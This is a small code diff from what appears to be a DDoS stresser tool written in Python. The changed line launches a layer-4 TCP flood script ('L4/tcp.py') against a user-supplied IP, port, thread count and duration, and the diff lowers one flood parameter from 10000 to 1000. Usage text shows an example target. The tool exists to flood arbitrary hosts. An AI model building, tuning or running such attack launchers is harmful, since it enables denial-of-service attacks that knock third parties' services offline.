@@ -459,7 +459,7 @@ def main():
                                 time = sin.split()[4]
                                 Screen.wrapper(attack)
                                 os.system ("clear")
-                                os.system(f'cd L4 && python tcp.py {ip} {port} 10000 {thread} {time}')  
+                                os.system(f'cd L4 && python tcp.py {ip} {port} 1000 {thread} {time}')  
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mTCP <ip> <port> <thread> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mTCP 1.1.1.1 80 10 120')
